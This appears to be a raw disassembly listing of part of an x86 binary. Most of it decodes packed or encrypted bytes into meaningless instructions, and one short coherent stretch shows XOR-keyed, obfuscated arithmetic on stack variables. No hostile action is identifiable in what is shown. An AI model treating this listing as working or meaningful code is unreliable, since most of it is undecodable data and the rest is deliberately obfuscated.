  41ecff:	bndldx bnd2,[edx+0x7]
  41ed03:	jge    0x41ed73
  41ed05:	popf   
  41ed06:	aad    0x51
  41ed08:	xor    BYTE PTR ds:0x2f54065f,bh
  41ed0e:	adc    ch,BYTE PTR [esi]
  41ed10:	fldenv [eax+0x12116be4]
  41ed16:	shl    BYTE PTR [ebx-0x7],cl
  41ed19:	push   eax
  41ed1a:	gs sbb al,0xad
  41ed1d:	out    0xd7,al
  41ed1f:	dec    esp
  41ed20:	mov    dl,0x1c
  41ed22:	loopne 0x41ed36
  41ed24:	jnp    0x41ecfb
  41ed26:	and    al,0x49
  41ed28:	mov    ch,0x2d
  41ed2a:	jns    0x41ed37
  41ed2c:	mov    al,0xd4
  41ed2e:	jne    0x41ed3c
  41ed30:	adc    BYTE PTR [esp+ecx*4-0xaa38268],dh
  41ed37:	sbb    al,0x4a
  41ed39:	aam    0x97
  41ed3b:	sbb    BYTE PTR [ebx-0x3abc4259],bh
  41ed41:	stc    
  41ed42:	cs fadd DWORD PTR ss:[edi+0x11]
  41ed47:	jns    0x41ed7d
  41ed49:	sar    DWORD PTR [eax-0x6b],0xc1
  41ed4d:	repnz daa 
  41ed4f:	inc    edx
  41ed50:	test   eax,0xc21765f8
  41ed55:	fsubrp st(5),st
  41ed57:	ror    edi,0xbd
  41ed5a:	xor    ch,BYTE PTR [ecx]
  41ed5c:	mov    ebx,0xad978e7a
  41ed61:	add    al,BYTE PTR [esi-0x7b301d36]
  41ed67:	adc    esi,0x6e1732f2
  41ed6d:	mov    dh,0x30
  41ed6f:	(bad)  
  41ed70:	sub    al,0xa3
  41ed72:	xor    edx,DWORD PTR [ecx+0x47661dec]
  41ed78:	add    ecx,eax
  41ed7a:	out    0x47,al
  41ed7c:	and    eax,0xca1a8ffa
  41ed81:	paddusb mm2,QWORD PTR [eax]
  41ed84:	test   al,0xaa
  41ed86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed87:	lods   eax,DWORD PTR ds:[esi]
  41ed88:	mov    al,0xbe
  41ed8a:	push   ss
  41ed8b:	add    DWORD PTR [edx],0x53ab33a4
  41ed91:	outs   dx,DWORD PTR ds:[esi]
  41ed92:	sbb    dl,BYTE PTR [eax+0x3e1e84b]
  41ed98:	dec    ecx
  41ed99:	push   0xa8e2021
  41ed9e:	ret    0x875
  41eda1:	retf   0x1207
  41eda4:	lods   al,BYTE PTR ds:[esi]
  41eda5:	sbb    al,0xad
  41eda7:	cs (bad) 
  41eda9:	adc    edx,esi
  41edab:	enter  0x3427,0x86
  41edaf:	pushf  
  41edb0:	add    dh,BYTE PTR [eax+0x1b]
  41edb3:	xchg   BYTE PTR [edx+0x28],ah
  41edb6:	sub    al,0x38
  41edb8:	jmp    0x772ef0e8
  41edbd:	ja     0x41ed69
  41edbf:	in     al,dx
  41edc0:	sar    DWORD PTR [ecx-0x15602d15],cl
  41edc6:	into   
  41edc7:	push   es
  41edc8:	imul   ecx,DWORD PTR [edx+0x547815f6],0x5e
  41edcf:	dec    ecx
  41edd0:	jb     0x41ee1d
  41edd2:	jno    0x41edf9
  41edd4:	aaa    
  41edd5:	repnz push edx
  41edd7:	rcr    DWORD PTR [edi+ebx*8],0x20
  41eddb:	shl    BYTE PTR [edi-0x2d],1
  41edde:	out    0xc3,al
  41ede0:	out    0x6e,eax
  41ede2:	ffreep st(5)
  41ede4:	inc    ebp
  41ede5:	sub    DWORD PTR [eax-0x8bffb5d],ebp
  41edeb:	mov    dh,0x9a
  41eded:	xchg   bp,ax
  41edef:	mov    DWORD PTR [esi],edx
  41edf1:	jmp    0x5571:0xa3a81d97
  41edf8:	out    dx,eax
  41edf9:	lock daa 
  41edfb:	adc    ecx,eax
  41edfd:	aam    0xf5
  41edff:	fimul  DWORD PTR [edi+eiz*4+0x57923523]
  41ee06:	in     eax,0x96
  41ee08:	ds pop es
  41ee0a:	fs jne 0x41ee60
  41ee0d:	push   0xffffffc0
  41ee0f:	inc    esp
  41ee10:	push   esi
  41ee11:	lahf   
  41ee12:	pop    eax
  41ee13:	jns    0x41ee25
  41ee15:	mov    eax,0xf6f1ba1
  41ee1a:	shr    ah,cl
  41ee1c:	popa   
  41ee1d:	jnp    0x41ee4b
  41ee1f:	stos   BYTE PTR es:[edi],al
  41ee20:	add    BYTE PTR [eax-0x3eb1e060],dh
  41ee26:	ret    
  41ee27:	scas   al,BYTE PTR es:[edi]
  41ee28:	aad    0x98
  41ee2a:	inc    eax
  41ee2b:	loope  0x41ee3e
  41ee2d:	or     al,0xaa
  41ee2f:	fcomi  st,st(6)
  41ee31:	aas    
  41ee32:	lea    edi,[bp+si]
  41ee35:	cmp    DWORD PTR [esi-0x2650c46b],eax
  41ee3b:	ret    
  41ee3c:	add    al,0x4c
  41ee3e:	sub    al,bl
  41ee40:	push   ds
  41ee41:	iret   
  41ee42:	loop   0x41ee26
  41ee44:	and    eax,0xbb7e8625
  41ee49:	dec    ebp
  41ee4a:	push   esi
  41ee4b:	shl    BYTE PTR [ebx+edx*4+0x682fa8b8],0x80
  41ee53:	(bad)  
  41ee54:	loop   0x41edf8
  41ee56:	push   ebx
  41ee57:	fistp  QWORD PTR [eax]
  41ee59:	sar    esi,1
  41ee5b:	sbb    eax,DWORD PTR [edx]
  41ee5d:	adc    al,0xd1
  41ee5f:	pushf  
  41ee60:	call   0x452ff490
  41ee65:	or     edx,ecx
  41ee67:	jnp    0x41eded
  41ee69:	jo     0x41ee6b
  41ee6b:	pop    ss
  41ee6c:	data16 mov dh,0xd7
  41ee6f:	test   BYTE PTR [edx-0x67],bl
  41ee72:	ror    DWORD PTR [eax],1
  41ee74:	out    dx,al
  41ee75:	rcr    DWORD PTR [esi+0x51],0x3
  41ee79:	xor    al,0x55
  41ee7b:	mov    ebp,ds
  41ee7d:	mov    ebp,esp
  41ee7f:	ret    0x71bb
  41ee82:	out    0xcc,al
  41ee84:	iret   
  41ee85:	lods   eax,DWORD PTR ds:[esi]
  41ee86:	sub    al,bh
  41ee88:	rcr    DWORD PTR [ecx],cl
  41ee8a:	popf   
  41ee8b:	loopne 0x41ee85
  41ee8d:	mov    bh,0x57
  41ee8f:	pop    ecx
  41ee90:	dec    esi
  41ee91:	push   ebx
  41ee92:	std    
  41ee93:	into   
  41ee94:	cmp    al,cl
  41ee96:	push   0x7f7e1eb0
  41ee9b:	add    esi,DWORD PTR [eax-0x7a]
  41ee9e:	(bad)  
  41ee9f:	push   ebp
  41eea0:	sub    DWORD PTR [eax+edx*2+0x1a2583ed],0x3ed1fe47
  41eeab:	scas   al,BYTE PTR es:[edi]
  41eeac:	sbb    BYTE PTR ss:0x28e66599,bh
  41eeb3:	cmp    DWORD PTR ds:0x7c0bed5f,esi
  41eeb9:	jl     0x41eea4
  41eebb:	es mov ah,0xba
  41eebe:	cdq    
  41eebf:	cdq    
  41eec0:	sbb    BYTE PTR ds:[ecx],ch
  41eec3:	test   BYTE PTR [ecx],0x29
  41eec6:	jl     0x41ee7d
  41eec8:	test   al,0x7a
  41eeca:	xor    DWORD PTR [edx],eax
  41eecc:	imul   edi,edx,0xecdc6d2b
  41eed2:	jnp    0x41eeef
  41eed4:	ret    0xc322
  41eed7:	jg     0x41ef12
  41eed9:	xchg   ecx,eax
  41eeda:	outs   dx,DWORD PTR ds:[esi]
  41eedb:	shr    BYTE PTR [ebx+0x6e],cl
  41eede:	add    al,0xa9
  41eee0:	mov    al,0x58
  41eee2:	lock xchg ecx,eax
  41eee4:	popa   
  41eee5:	and    eax,DWORD PTR [edi+0x58aab2a7]
  41eeeb:	fdivr  DWORD PTR [eax]
  41eeed:	mov    gs,WORD PTR [ebp+0x3d]
  41eef0:	push   esi
  41eef1:	xlat   BYTE PTR ds:[ebx]
  41eef2:	jae    0x41ef15
  41eef4:	mov    eax,0x5839d84c
  41eef9:	or     BYTE PTR [eax+eax*2-0x69],dh
  41eefd:	das    
  41eefe:	and    eax,0xd09a223a
  41ef03:	jne    0x41eecc
  41ef05:	and    al,ah
  41ef07:	addr16 pop eax
  41ef09:	mov    edi,0xd4a3e58c
  41ef0e:	dec    ebp
  41ef0f:	popf   
  41ef10:	fwait
  41ef11:	jno    0x41ef8c
  41ef13:	test   ebp,edx
  41ef15:	lods   al,BYTE PTR ds:[esi]
  41ef16:	adc    BYTE PTR [eax-0x7802b526],ch
  41ef1c:	lahf   
  41ef1d:	retf   0x8a23
  41ef20:	dec    dx
  41ef22:	loopne 0x41ef58
  41ef24:	add    edx,DWORD PTR [edx+eax*8]
  41ef27:	adc    esi,eax
  41ef29:	popf   
  41ef2a:	scas   al,BYTE PTR es:[edi]
  41ef2b:	jg     0x41ef17
  41ef2d:	test   eax,0x4d460ddc
  41ef32:	inc    edi
  41ef33:	clc    
  41ef34:	cmp    eax,0x5857d0fe
  41ef39:	mov    ds:0x7217de24,al
  41ef3e:	mov    esi,ebx
  41ef40:	xor    eax,0x4aeeea44
  41ef45:	ret    
  41ef46:	sub    ebp,DWORD PTR [edi+0x7f831346]
  41ef4c:	dec    esi
  41ef4d:	loope  0x41ef14
  41ef4f:	popa   
  41ef50:	sti    
  41ef51:	inc    esp
  41ef52:	into   
  41ef53:	outs   dx,DWORD PTR ds:[esi]
  41ef54:	pop    es
  41ef55:	retf   
  41ef56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef57:	(bad)  
  41ef58:	cmp    bh,cl
  41ef5a:	mov    esi,0x4f953d8
  41ef5f:	jne    0x41ef5b
  41ef61:	sti    
  41ef62:	fwait
  41ef63:	outs   dx,BYTE PTR ds:[esi]
  41ef64:	mov    ds:0x7e831e09,al
  41ef69:	std    
  41ef6a:	out    0xc6,eax
  41ef6c:	push   es
  41ef6d:	pop    ds
  41ef6e:	stos   BYTE PTR es:[edi],al
  41ef6f:	add    eax,0x4b27f49a
  41ef74:	cwde   
  41ef75:	push   es
  41ef76:	fmul   DWORD PTR [edi+0x4f]
  41ef79:	arpl   WORD PTR [ecx+0x69],sp
  41ef7c:	mov    ecx,0x28f50eb4
  41ef81:	fisubr DWORD PTR [eax]
  41ef83:	adc    BYTE PTR [edi+esi*8+0x6e],ch
  41ef87:	pop    es
  41ef88:	sti    
  41ef89:	xchg   esi,eax
  41ef8a:	mov    cl,0x5d
  41ef8c:	mov    gs,WORD PTR [edx]
  41ef8e:	cs push edx
  41ef90:	ja     0x41efe9
  41ef92:	test   eax,0xb050924b
  41ef97:	push   ds
  41ef98:	dec    BYTE PTR [eax-0x28]
  41ef9b:	mov    esi,DWORD PTR [edx+0x5e]
  41ef9e:	inc    ecx
  41ef9f:	jmp    DWORD PTR [ebx+ecx*4]
  41efa2:	sub    dh,BYTE PTR [esp+ecx*4-0x14]
  41efa6:	inc    edi
  41efa7:	in     al,dx
  41efa8:	ss out 0x93,eax
  41efab:	aaa    
  41efac:	mov    eax,0xc1786253
  41efb1:	xlat   BYTE PTR ds:[ebx]
  41efb2:	call   FWORD PTR [edx]
  41efb4:	mov    ebx,0x9ce030a4
  41efb9:	rcl    DWORD PTR [edi],1
  41efbb:	xor    dl,BYTE PTR [edi-0x15de608c]
  41efc1:	bound  ebp,QWORD PTR [edi]
  41efc3:	sar    DWORD PTR [esi],0x90
  41efc6:	mov    esi,0x437854b2
  41efcb:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41efcd:	out    dx,al
  41efce:	xchg   BYTE PTR ds:0x7c6b9008,dh
  41efd4:	int3   
  41efd5:	ins    DWORD PTR es:[edi],dx
  41efd6:	or     DWORD PTR [eax-0x34],edx
  41efd9:	outs   dx,BYTE PTR ds:[esi]
  41efda:	addr16 mov esp,0xa663f686
  41efe0:	jge    0x41f008
  41efe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efe3:	pop    edi
  41efe4:	push   esp
  41efe5:	fstp   QWORD PTR [esi+ebp*4]
  41efe8:	mov    dl,0x9e
  41efea:	lods   eax,DWORD PTR ds:[esi]
  41efeb:	sbb    eax,0xb84a8be4
  41eff0:	adc    DWORD PTR [ecx+eiz*8-0x3a630abd],esi
  41eff7:	iretw  
  41eff9:	push   ds
  41effa:	sub    bl,BYTE PTR [esi+0x28]
  41effd:	xchg   BYTE PTR [ebx],dh
  41efff:	enter  0xce03,0xf
  41f003:	test   DWORD PTR [ebx-0x24],esp
  41f006:	(bad)  
  41f007:	dec    DWORD PTR [ebx+0x4d89f44d]
  41f00d:	or     cl,ch
  41f00f:	sub    eax,0x8b000000
  41f014:	dec    ebp
  41f015:	or     BYTE PTR [ebx-0x37cc07ab],cl
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xad716403
  41f0bf:	pop    esi
  41f0c0:	mov    eax,ds:0x6261d851
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx+0x53]
  41f0ca:	and    al,0x5a
  41f0cc:	push   cs
  41f0cd:	dec    ebx
  41f0ce:	pop    esi
  41f0cf:	(bad)  
  41f0d0:	pop    ss
  41f0d1:	jno    0x41f0ad
  41f0d3:	(bad)  
  41f0d4:	(bad)  
  41f0d5:	mov    ecx,0x9403c488
  41f0da:	sbb    eax,0x5053ac76
  41f0df:	int    0x2a
  41f0e1:	and    al,0x52
  41f0e3:	cmp    ebp,DWORD PTR fs:[eax]
  41f0e6:	sbb    edx,DWORD PTR [ecx]
  41f0e8:	(bad)  
  41f0ea:	push   eax
  41f0eb:	cld    
  41f0ec:	inc    ebx
  41f0ed:	into   
  41f0ee:	jg     0x41f0b7
  41f0f0:	into   
  41f0f1:	call   0x56694128
  41f0f6:	fst    QWORD PTR [edi+0x29]
  41f0f9:	xchg   edi,eax
  41f0fa:	inc    ecx
  41f0fb:	es push ss
  41f0fd:	dec    DWORD PTR [eax+0x0]
  41f100:	shl    BYTE PTR [esi-0x24ab2da8],cl
  41f106:	test   al,0x24
  41f108:	ss jmp 0x41f143
  41f10b:	scas   eax,DWORD PTR es:[edi]
  41f10c:	imul   ecx,DWORD PTR [edx],0x82c8d736
  41f112:	lahf   
  41f113:	xor    BYTE PTR [eax+0x50],al
  41f116:	inc    ebx
  41f117:	xor    DWORD PTR ds:0xb0beecf0,0xf9476157
  41f121:	dec    esp
  41f122:	fdivr  st,st(3)
  41f124:	fidivr WORD PTR [ebp+0x636f3d4d]
  41f12a:	fwait
  41f12b:	test   al,0x5f
  41f12d:	cwde   
  41f12e:	call   FWORD PTR [ecx-0x75]
  41f131:	inc    esp
  41f132:	jne    0x41f0c0
  41f134:	out    dx,eax
  41f135:	xor    bh,BYTE PTR [ebx-0x5d]
  41f138:	jmp    0x16fd:0xc58c8454
  41f13f:	das    
  41f140:	adc    DWORD PTR [edi],0xfa2b4f69
  41f146:	xor    ecx,DWORD PTR [ebx-0x73]
  41f149:	data16 sub BYTE PTR [edx-0x54],al
  41f14d:	adc    bh,dl
  41f14f:	sub    BYTE PTR [ecx+0x65],dh
  41f152:	daa    
  41f153:	inc    ecx
  41f154:	arpl   si,bp
  41f156:	(bad)  
  41f157:	rol    DWORD PTR [ebx],1
  41f159:	gs imul eax,ecx,0x772a8c29
  41f160:	mov    ecx,0x299bb485
  41f165:	and    eax,0xa37545f9
  41f16a:	mov    al,ds:0x472466d5
  41f16f:	push   edx
  41f170:	shr    BYTE PTR [esi+0x32d1ecb4],cl
  41f176:	jmp    DWORD PTR [esp+eax*8]
  41f179:	mov    dl,0xa8
  41f17b:	in     al,0x28
  41f17d:	pop    ebx
  41f17e:	retf   0xf7d0
  41f181:	jbe    0x41f15e
  41f183:	je     0x41f1cf
  41f185:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f187:	je     0x41f1a6
  41f189:	rol    esp,cl
  41f18b:	add    eax,0xcb73f6d3
  41f190:	push   0xffffffac
  41f192:	(bad)  
  41f193:	mov    bh,0x9c
  41f195:	pop    esp
  41f196:	jnp    0x41f14a
  41f198:	xchg   esp,eax
  41f199:	in     al,dx
  41f19a:	push   edi
  41f19b:	cmp    al,bh
  41f19d:	pop    edi
  41f19e:	inc    edi
  41f19f:	add    dl,ch
  41f1a1:	gs clc 
  41f1a3:	xchg   ebp,eax
  41f1a4:	jmp    FWORD PTR [edx]
  41f1a6:	dec    ebx
  41f1a7:	pop    eax
  41f1a8:	fisttp QWORD PTR [edx+0x29]
  41f1ab:	mov    esp,0xd66efc5f
  41f1b0:	mov    ds:0x27a8563e,eax
  41f1b5:	xchg   esi,eax
  41f1b6:	std    
  41f1b7:	fs sub eax,0xb86a3b79
  41f1bd:	adc    al,0x99
  41f1bf:	mov    bl,0xf5
  41f1c1:	stos   BYTE PTR es:[edi],al
  41f1c2:	push   es
  41f1c3:	addr16 fwait
  41f1c5:	or     al,0x31
  41f1c7:	into   
  41f1c8:	mov    dh,0x74
  41f1ca:	ss data16 jmp 0x41f233
  41f1ce:	pushf  
  41f1cf:	jnp    0x41f1a8
  41f1d1:	icebp  
  41f1d2:	jbe    0x41f1e5
  41f1d4:	outs   dx,DWORD PTR ds:[esi]
  41f1d5:	pop    es
  41f1d6:	fwait
  41f1d7:	mov    edx,0x36316e85
  41f1dc:	inc    eax
  41f1dd:	shr    DWORD PTR [ebp+0x6cd50be2],1
  41f1e3:	push   esp
  41f1e4:	pushf  
  41f1e5:	sahf   
  41f1e6:	jp     0x41f1d5
  41f1e8:	or     BYTE PTR [esi-0x41ea0abc],0x29
  41f1ef:	ins    DWORD PTR es:[edi],dx
  41f1f0:	hlt    
  41f1f1:	loop   0x41f1fa
  41f1f3:	rcr    DWORD PTR [ebx-0x37],cl
  41f1f6:	int    0xa2
  41f1f8:	cmp    cl,BYTE PTR [eax-0x5d]
  41f1fb:	inc    eax
  41f1fc:	ficom  WORD PTR [edi-0x1b079572]
  41f202:	dec    esp
  41f203:	mov    ds:0xc2693612,eax
  41f208:	mov    ecx,ecx
  41f20a:	ja     0x41f231
  41f20c:	ss mov bl,0xc9
  41f20f:	inc    eax
  41f210:	lea    ebx,[esi+0x28673c5d]
  41f216:	loopne 0x41f243
  41f218:	mov    fs,WORD PTR [edx-0x7def83e4]
  41f21e:	ins    DWORD PTR es:[edi],dx
  41f21f:	shr    BYTE PTR [ebx+edi*4-0x6166dd98],cl
  41f226:	(bad)  
  41f227:	es mov esp,DWORD PTR fs:[eax-0x11]
  41f22c:	outs   dx,BYTE PTR ds:[esi]
  41f22d:	push   es
  41f22e:	sub    ah,ah
  41f230:	xor    al,0xc6
  41f232:	jl     0x41f1fa
  41f234:	shr    DWORD PTR [eax],1
  41f236:	lds    esi,FWORD PTR [esi-0x7d53f9fa]
  41f23c:	repnz sub al,0x6e
  41f23f:	mov    eax,0xbc76b8e6
  41f244:	into   
  41f245:	and    eax,0xe62a9e04
  41f24a:	mov    DWORD PTR [ebx+0x7d02e3],esi
  41f250:	fdivr  st,st(4)
  41f252:	jns    0x41f22b
  41f254:	add    BYTE PTR [ebx-0x7f6af6c1],cl
  41f25a:	mov    ecx,0x754d65eb
  41f25f:	stos   DWORD PTR es:[edi],eax
  41f260:	cmp    BYTE PTR [ecx],ah
  41f262:	inc    edx
  41f263:	sti    
  41f264:	and    bh,bl
  41f266:	jp     0x41f275
  41f268:	int    0xeb
  41f26a:	cmp    dl,BYTE PTR [eax+0x1c]
  41f26d:	imul   edx,DWORD PTR [ecx-0x1a],0xe4377c06
  41f274:	jge    0x41f2b2
  41f276:	dec    edx
  41f277:	ins    DWORD PTR es:[edi],dx
  41f278:	mov    al,ds:0x3061090f
  41f27d:	jnp    0x41f2c7
  41f27f:	scas   eax,DWORD PTR es:[edi]
  41f280:	or     eax,0xa8ec6752
  41f285:	sub    esp,esi
  41f287:	and    eax,0x91ae4662
  41f28c:	data16 or al,0xce
  41f28f:	outs   dx,BYTE PTR ds:[esi]
  41f290:	mov    DWORD PTR [esi+0x4a8c9c46],ecx
  41f296:	fadd   QWORD PTR [ecx-0x27]
  41f299:	xchg   edx,eax
  41f29a:	xchg   DWORD PTR [edi+edx*1-0x3a0bf7d4],edx
  41f2a1:	and    DWORD PTR [edi+0x1db5fab6],0xfffffff0
  41f2a8:	ficomp WORD PTR [esi+ecx*1+0x4d]
  41f2ac:	inc    ecx
  41f2ad:	repz pop ss
  41f2af:	jge    0x41f25c
  41f2b1:	jne    0x41f2a6
  41f2b3:	scas   eax,DWORD PTR es:[edi]
  41f2b4:	call   0x617231c2
  41f2b9:	mov    ds:0xd86ae509,eax
  41f2be:	sub    ch,BYTE PTR [ebx]
  41f2c0:	inc    eax
  41f2c1:	cli    
  41f2c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2c3:	xchg   esp,eax
  41f2c4:	xchg   edi,eax
  41f2c5:	dec    esi
  41f2c6:	scas   al,BYTE PTR es:[edi]
  41f2c7:	add    eax,0x681fca7e
  41f2cc:	jl     0x41f303
  41f2ce:	bound  edi,QWORD PTR es:[ebx+0x61d27355]
  41f2d5:	jmp    0xf4c070c5
  41f2da:	(bad)  
  41f2db:	lock cli 
  41f2dd:	dec    edx
  41f2de:	mov    ds:0x56025f99,eax
  41f2e3:	cld    
  41f2e4:	int3   
  41f2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e6:	stos   BYTE PTR es:[edi],al
  41f2e7:	das    
  41f2e8:	sbb    eax,0x56aa0365
  41f2ed:	into   
  41f2ee:	xor    eax,0xf43d4e3d
  41f2f3:	pop    ds
  41f2f4:	jecxz  0x41f31c
  41f2f6:	jb     0x41f30a
  41f2f8:	scas   al,BYTE PTR es:[edi]
  41f2f9:	leave  
  41f2fa:	dec    esp
  41f2fb:	sub    al,dh
  41f2fd:	xor    eax,0xa2fbcba6
  41f302:	lods   eax,DWORD PTR ds:[esi]
  41f303:	test   BYTE PTR [di],cl
  41f306:	jp     0x41f2a8
  41f308:	addr16 push ds
  41f30a:	aas    
  41f30b:	and    bl,ch
  41f30d:	in     eax,0x8a
  41f30f:	enter  0xa8f9,0x15
  41f313:	loop   0x41f2c4
  41f315:	mov    esp,0x13b5d163
  41f31a:	leave  
  41f31b:	push   ecx
  41f31c:	es daa 
  41f31e:	sub    DWORD PTR [edi-0x73],0x3dbff0e0
  41f325:	adc    BYTE PTR [ebx],dh
  41f327:	ds int3 
  41f329:	out    0x63,eax
  41f32b:	(bad)  
  41f32c:	xor    eax,0x23c45c7e
  41f331:	sti    
  41f332:	sub    BYTE PTR [ebp+0x731f4dd8],bl
  41f338:	pop    es
  41f339:	stc    
  41f33a:	jmp    DWORD PTR [edx]
  41f33c:	arpl   WORD PTR [edi-0x7ff9644d],ax
  41f342:	inc    esp
  41f343:	mov    eax,0x3fb5155f
  41f348:	jnp    0x41f360
  41f34a:	xchg   BYTE PTR [ebp+esi*2-0xa],ah
  41f34e:	pop    edi
  41f34f:	cld    
  41f350:	mov    ch,0xff
  41f352:	add    al,0xf2
  41f354:	hlt    
  41f355:	leave  
  41f356:	inc    edx
  41f357:	mov    ah,0x37
  41f359:	cmp    DWORD PTR [ebp+0x2ac7add4],0xfaab74cc
  41f363:	xor    al,0xaf
  41f365:	fstp   QWORD PTR [ecx-0x79]
  41f368:	stc    
  41f369:	mov    WORD PTR [edx+esi*1-0x5d8cd28],gs
  41f370:	push   eax
  41f371:	and    al,0x43
  41f373:	out    0x49,al
  41f375:	sbb    al,0x7d
  41f377:	xchg   esi,eax
  41f378:	dec    BYTE PTR [ecx-0x371f1da8]
  41f37e:	pop    edi
  41f37f:	inc    ebp
  41f380:	lods   eax,DWORD PTR ds:[esi]
  41f381:	add    cl,bl
  41f383:	mov    cl,0x5f
  41f386:	xchg   edx,eax
  41f387:	das    
  41f388:	mov    dl,ch
  41f38a:	(bad)  
  41f38b:	or     ecx,DWORD PTR [esi-0x6ddbbba9]
  41f391:	sbb    DWORD PTR [ecx],0xffffffd4
  41f394:	cmp    al,0xfa
  41f396:	jnp    0x41f3f4
  41f398:	or     ebx,esp
  41f39a:	push   esp
  41f39b:	pusha  
  41f39c:	mov    DWORD PTR [edi+0x4c],edx
  41f39f:	jae    0x41f3c3
  41f3a1:	das    
  41f3a2:	sbb    eax,0x7616c7ca
  41f3a7:	loopne 0x41f409
  41f3a9:	adc    DWORD PTR [eax-0x80],0x1b273d14
  41f3b0:	adc    esp,eax
  41f3b2:	stc    
  41f3b3:	imul   eax,ebx,0x37
  41f3b6:	xchg   BYTE PTR [edi+0xadcc74c],bl
  41f3bc:	(bad)  [eax+0x3e]
  41f3bf:	fabs   
  41f3c1:	dec    ecx
  41f3c2:	inc    ebx
  41f3c3:	bound  ebx,QWORD PTR [eax+0x3913a64e]
  41f3c9:	add    ecx,edi
  41f3cb:	dec    esp
  41f3cc:	mov    esi,0xc086b360
  41f3d1:	ins    DWORD PTR es:[edi],dx
  41f3d2:	or     eax,0x7556c070
  41f3d7:	mov    ebx,0x29f3fe04
  41f3dc:	fnsave [ebx-0x7f]
  41f3df:	mov    ch,0xb2
  41f3e1:	mov    ah,dh
  41f3e3:	add    BYTE PTR [edx+esi*2],bh
  41f3e6:	arpl   WORD PTR [edi-0x33],bx
  41f3e9:	ror    BYTE PTR [edx],cl
  41f3eb:	sbb    DWORD PTR [edx+0xa],eax
  41f3ee:	xor    DWORD PTR [esi-0x76a3e0f0],ecx
  41f3f4:	sbb    BYTE PTR ds:0x2e19a256,ah
  41f3fa:	scas   eax,DWORD PTR es:[edi]
  41f3fb:	jnp    0x41f3f8
  41f3fd:	mov    ebp,0xa976e72d
  41f402:	jnp    0x41f477
  41f404:	inc    edx
  41f405:	mov    BYTE PTR [eax-0x2c],0xdb
  41f409:	jecxz  0x41f445
  41f40b:	xchg   ebx,eax
  41f40c:	jns    0x41f404
  41f40e:	dec    ebp
  41f40f:	push   ss
  41f410:	mov    esp,0xa4f046ac
  41f415:	(bad)  
  41f416:	mov    ch,0xad
  41f418:	xchg   esi,eax
  41f419:	das    
  41f41a:	adc    BYTE PTR [edi],ch
  41f41c:	retf   0x54e7
  41f41f:	(bad)  
  41f421:	aad    0x9
  41f423:	mov    ah,dl
  41f425:	loop   0x41f416
  41f427:	pusha  
  41f428:	cli    
  41f429:	jns    0x41f46a
  41f42b:	stc    
  41f42c:	push   0x7a683622
  41f431:	(bad)  
  41f432:	jbe    0x41f40c
  41f434:	lods   al,BYTE PTR ds:[esi]
  41f435:	adc    eax,0x71f7189a
  41f43a:	sub    eax,0xbf26fb5d
  41f43f:	jbe    0x41f3c3
  41f441:	dec    esp
  41f442:	cli    
  41f443:	pop    ss
  41f444:	fwait
  41f445:	mov    edi,0x1b9460c4
  41f44a:	enter  0x264b,0x7d
  41f44e:	inc    BYTE PTR ds:0xc5e84cfe
  41f454:	inc    esi
  41f455:	cld    
  41f456:	mov    BYTE PTR [ecx-0x19],ah
  41f459:	jns    0x41f4cd
  41f45b:	push   edx
  41f45c:	mov    eax,ds:0x55258edf
  41f461:	dec    esp
  41f462:	dec    ebp
  41f463:	push   edi
  41f464:	mov    ah,0x5b
  41f466:	dec    esi
  41f467:	inc    edi
  41f468:	es loopne 0x41f4a6
  41f46b:	sub    eax,0x89372323
  41f470:	mov    al,ds:0x76cde86c
  41f475:	out    0x4f,al
  41f477:	mov    ebp,0x9b531c53
  41f47c:	cmp    esp,eax
  41f47e:	in     eax,0x4a
  41f480:	test   BYTE PTR [eax-0x118e1ec3],al
  41f486:	popf   
  41f487:	iret   
  41f488:	sbb    DWORD PTR [esi-0x58],edi
